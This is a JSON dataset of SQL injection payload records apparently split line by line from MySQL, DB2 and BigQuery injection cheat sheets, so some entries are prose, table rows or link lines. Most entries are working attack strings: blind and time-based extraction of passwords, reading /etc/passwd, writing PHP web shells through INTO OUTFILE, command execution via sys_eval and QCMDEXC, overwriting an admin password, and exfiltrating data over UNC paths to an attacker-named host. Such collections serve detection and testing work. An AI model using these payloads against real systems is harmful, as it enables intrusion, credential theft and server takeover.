    "payload": "AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "* **Underscore** (`_`): This wildcard represents a single character. It's used for more precise matching when you know the structure of the data but not the specific character at a particular position.",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT * FROM products WHERE product_name LIKE '%user_input%'",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| Payload | Description |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | Checking length |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --`   | Checking for the presence of digits |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | Checking for data starting by \"a\" |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "'+BENCHMARK(3200,SHA1(1))+'",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')#",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) ",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) ",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| ID  | USER      | HOST           | DB     | COMMAND | TIME | STATE      | INFO |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| --- | --------- | ---------------- | ------- | ------- | ---- | ---------- | ---- |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| 1   | root   | localhost        | testdb  | Query  | 10 | executing  | SELECT * FROM some_table |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| 2   | app_uset  | 192.168.0.101    | appdb   | Sleep  | 300 | sleeping  | NULL |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| 3   | gues_user | example.com:3360 | NULL    | Connect | 0    | connecting | NULL |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "UNION ALL SELECT LOAD_FILE('/etc/passwd') ",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "[...] UNION SELECT \"<?php system($_GET['cmd']); ?>\" into outfile \"C:\\\\xampp\\\\htdocs\\\\backdoor.php\"",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\\\wamp\\\\www\\\\pwnd.php'-- ",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "[...] union all select 1,2,3,4,\"<?php echo shell_exec($_GET['cmd']);?>\",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "mysql> SELECT sys_eval('id');",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| sys_eval('id') |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| uid=118(mysql) gid=128(mysql) groups=128(mysql) |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "attacker_dummy@example.com\", \"P@ssw0rd\"), (\"admin@example.com\", \"P@ssw0rd\") ON DUPLICATE KEY UPDATE password=\"P@ssw0rd\" ",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "INSERT INTO users (email, password) VALUES (\"attacker_dummy@example.com\", \"BCRYPT_HASH\"), (\"admin@example.com\", \"P@ssw0rd\") ON DUPLICATE KEY UPDATE password=\"P@ssw0rd\" -- \", \"BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT\");",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "This query will insert a row for the user \"`attacker_dummy@example.com`\". It will also insert a row for the user \"`admin@example.com`\".",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "Because this row already exists, the `ON DUPLICATE KEY UPDATE` keyword tells MySQL to update the `password` column of the already existing row to \"P@ssw0rd\". After this, we can simply authenticate with \"`admin@example.com`\" and the password \"P@ssw0rd\".",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "In MYSQL \"`admin`\" and \"`admin`\" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "Payload: `username = \"admin               a\"",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT @@version INTO OUTFILE '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt';",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT @@version INTO DUMPFILE '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt;",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.hacker.site\\\\a.txt'));",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "The term \"UNC path\" refers to the Universal Naming Convention path used to specify the location of resources such as shared files or devices on a network. It is commonly used in Windows environments to access files over a network using a format like `\\\\server\\share\\file`.",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT LOAD_FILE('\\\\\\\\error\\\\abc');",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT '' INTO DUMPFILE '\\\\\\\\error\\\\abc';",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT '' INTO OUTFILE '\\\\\\\\error\\\\abc';",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "LOAD DATA INFILE '\\\\\\\\error\\\\abc' INTO TABLE DATABASE.TABLE_NAME;",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": ":warning: Don't forget to escape the '\\\\\\\\'.",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT * FROM mysql.innodb_table_stats;",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "mysql> SHOW TABLES IN dvwa;",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| Tables_in_dvwa |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| guestbook      |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| users          |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "mysql> SELECT @@innodb_version;",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| @@innodb_version |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| 5.6.31           |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "mysql> SELECT @@version;",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| @@version               |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| 5.6.31-0ubuntu0.15.10.1 |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "mysql> SELECT version();",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| version()               |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "mysql> SELECT @@GLOBAL.VERSION;",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| @@GLOBAL.VERSION |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| 8.0.27           |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "Requirement: `MySQL >= 5.7.22",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "* `json_arrayagg()` > 16,000,000 symbols",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "In MySQL, the e notation is used to represent numbers in scientific notation. It's a way to express very large or very small numbers in a concise format. The e notation consists of a number followed by the letter e and an exponent.",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "The format is: `base 'e' exponent`.",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "In the same way, the common payload to bypass authentication `' or ''='` is equivalent to `' or 1.e('')='` and `1' or 1.e(1) or '1'='1`.",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "This technique can be used to obfuscate queries to bypass WAF, for example: `1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "Wide byte injection is a specific type of SQL injection attack that targets applications using multi-byte character sets, like GBK or SJIS. The term \"wide byte\" refers to character encodings where one character can be represented by more than one byte. This type of injection is particularly relevant when the application and the database interpret multi-byte sequences differently.",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "* `%bf%27`: This is a URL-encoded representation of the byte sequence `0xbf27`. In the GBK character set, `0xbf27` decodes to a valid multibyte character followed by a single quote ('). When MySQL encounters this sequence, it interprets it as a single valid GBK character followed by a single quote, effectively ending the string.",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "* `%a1%27`: Represents the byte sequence `0xa127`. In GBK, this decodes to a valid multi-byte character followed by a single quote (`'`).",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "%A8%27 OR 1=1;",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "%bf' OR 1=1 -- ",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "$string = preg_replace('/'. preg_quote('\\\\') .'/', \"\\\\\\\\\\\\\", $string);          //escape any backslash",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "$string = preg_replace('/\\'/i', '\\\\\\'', $string);                               //escape single quote with a backslash",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "$string = preg_replace('/\\\"/', \"\\\\\\\"\", $string);                                //escape double quote with a backslash",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "return $string;",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "$id=check_addslashes($_GET['id']);",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "mysql_query(\"SET NAMES gbk\");",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "print_r(mysql_error());",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "Here's a breakdown of how the wide byte injection works:",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "For instance, if the input is `?id=1'`, PHP will add a backslash, resulting in the SQL query: `SELECT * FROM users WHERE id='1\\'' LIMIT 0,1`.",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "However, when the sequence `%df` is introduced before the single quote, as in `?id=1%df'`, PHP still adds the backslash. This results in the SQL query: `SELECT * FROM users WHERE id='1%df\\'' LIMIT 0,1`.",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "In the GBK character set, the sequence `%df%5c` translates to the character `\u9023`. So, the SQL query becomes: `SELECT * FROM users WHERE id='1\u9023'' LIMIT 0,1`. Here, the wide byte character `\u9023` effectively \"eating\" the added escape charactr, allowing for SQL injection.",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "Therefore, by using the payload `?id=1%df' and 1=1 --+`, after PHP adds the backslash, the SQL query transforms into: `SELECT * FROM users WHERE id='1\u9023' and 1=1 --+' LIMIT 0,1`. This altered query can be successfully injected, bypassing the intended SQL logic.",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "* [Error Based Injection | NetSPI SQL Injection Wiki - NetSPI - February 15, 2021](https://sqlwiki.netspi.com/injectionTypes/errorBased)",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 \n",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "'||QCMDEXC('QSH CMD(''system dspusrprf PROFILE'')')\n",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1\n",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "> IBM DB2 is a family of relational database management systems (RDBMS) developed by IBM. Originally created in the 1980s for mainframes, DB2 has evolved to support various platforms and workloads, including distributed systems, cloud environments, and hybrid deployments.",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| -------------------------- | --------------------------------- |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| Name        | Description                                                           |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| ----------- | --------------------------------------------------------------------- |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| SYSIBM      | Core system catalog tables storing metadata for database objects.     |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| SYSCAT      | User-friendly views for accessing metadata in the SYSIBM tables.      |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| SYSSTAT     | Statistics tables used by the DB2 optimizer for query optimization.   |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| SYSPUBLIC   | Metadata about objects available to all users (granted to PUBLIC).    |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| SYSIBMADM   | Administrative views for monitoring and managing the database system. |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| SYSTOOLs    | Tools, utilities, and auxiliary objects provided for database administration and troubleshooting. |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| Description      | SQL Query |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| ---------------- | ----------------------------------------- |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| DBMS version     | `select versionnumber, version_timestamp from sysibm.sysversions;` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| DBMS version     | `select service_level from table(sysproc.env_get_inst_info()) as instanceinfo` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| DBMS version     | `select getvariable('sysibm.version') from sysibm.sysdummy1` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| DBMS version     | `select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| DBMS version     | `select service_level,bld_level from sysibmadm.env_inst_info` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| Current user     | `select user from sysibm.sysdummy1` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| Current user     | `select session_user from sysibm.sysdummy1` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| Current user     | `select system_user from sysibm.sysdummy1` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| Current database | `select current server from sysibm.sysdummy1` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| OS info          | `select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| ---------------- | ------------------------------------ |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| List databases   | `SELECT distinct(table_catalog) FROM sysibm.tables` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| List databases   | `SELECT schemaname FROM syscat.schemata;` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| List columns     | `SELECT name, tbname, coltype FROM sysibm.syscolumns` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| List tables      | `SELECT table_name FROM sysibm.tables` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| List tables      | `SELECT name FROM sysibm.systables` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| List tables      | `SELECT tbname FROM sysibm.syscolumns WHERE name='username'` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| ---------------- | ------------------------------------------ |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| Substring        | `select substr('abc',2,1) FROM sysibm.sysdummy1` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| ASCII value      | `select chr(65) from sysibm.sysdummy1`     |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| CHAR to ASCII    | `select ascii('A') from sysibm.sysdummy1`  |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| Select Nth Row   | `select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| Bitwise AND      | `select bitand(1,0) from sysibm.sysdummy1` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| Bitwise AND NOT  | `select bitandnot(1,0) from sysibm.sysdummy1` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| Bitwise OR       | `select bitor(1,0) from sysibm.sysdummy1`  |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| Bitwise XOR      | `select bitxor(1,0) from sysibm.sysdummy1` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| Bitwise NOT      | `select bitnot(1,0) from sysibm.sysdummy1` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "Heavy queries, if user starts with ascii 68 ('D'), the heavy query will be executed, delaying the response.",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "> The QSYS2.QCMDEXC() procedure and scalar function can be used to execute IBM i CL commands.",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "'||QCMDEXC('QSH CMD(''system dspusrprf PROFILE'')')",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| List users | `select distinct(grantee) from sysibm.systabauth` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| List users | `select distinct(definer) from syscat.schemata` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| List users | `select distinct(authid) from sysibmadm.privileges` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| List users | `select grantee from syscat.dbauth` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| List privileges | `select * from syscat.tabauth` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| List privileges | `select * from SYSIBM.SYSUSERAUTH \u2014 List db2 system privilegies` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| List DBA accounts | `select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y'` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| List DBA accounts | `select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = 'Y' or SYSADMAUTH = 'G'` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "| Location of DB files | `select * from sysibmadm.reg_variables where reg_var_name='DB2PATH'` |",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "* [Pentestmonkey's DB2 SQL Injection Cheat Sheet - @pentestmonkey - September 17, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)",
    "category": "sql injection",
    "source_file": "DB2 Injection.md"
  },
  {
    "payload": "true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name#\n",
    "category": "sql injection",
    "source_file": "BigQuery Injection.md"
  },
  {
    "payload": "' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM  (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#\n",
    "category": "sql injection",
    "source_file": "BigQuery Injection.md"
  },
  {
    "payload": "' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#\n",
    "category": "sql injection",
    "source_file": "BigQuery Injection.md"
  },
  {
    "payload": "> Google BigQuery SQL Injection  is a type of security vulnerability where an attacker can execute arbitrary SQL queries on a Google BigQuery database by manipulating user inputs that are incorporated into SQL queries without proper sanitization. This can lead to unauthorized data access, data manipulation, or other malicious activities.",
    "category": "sql injection",
    "source_file": "BigQuery Injection.md"
  },
  {
    "payload": "* Use a classic single quote to trigger an error: `'",
    "category": "sql injection",
    "source_file": "BigQuery Injection.md"
  },
  {
    "payload": "| SQL Query                                             | Description |",
    "category": "sql injection",
    "source_file": "BigQuery Injection.md"
  },
  {
    "payload": "| ----------------------------------------------------- | -------------------- |",
    "category": "sql injection",
    "source_file": "BigQuery Injection.md"
  },
  {
    "payload": "| `SELECT @@project_id`                                 | Gathering project id |",
    "category": "sql injection",
    "source_file": "BigQuery Injection.md"
  },
  {
    "payload": "| `SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA` | Gathering all dataset names |",
    "category": "sql injection",
    "source_file": "BigQuery Injection.md"
  },
  {
    "payload": "| `select * from project_id.dataset_name.table_name`    | Gathering data from specific project id & dataset |",
    "category": "sql injection",
    "source_file": "BigQuery Injection.md"
  },
  {
    "payload": "| `/* PostgreSQL Comment */` | C-style comment                   |",
    "category": "sql injection",
    "source_file": "BigQuery Injection.md"
  },
  {
    "payload": "true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name#",
    "category": "sql injection",
    "source_file": "BigQuery Injection.md"
  },
  {
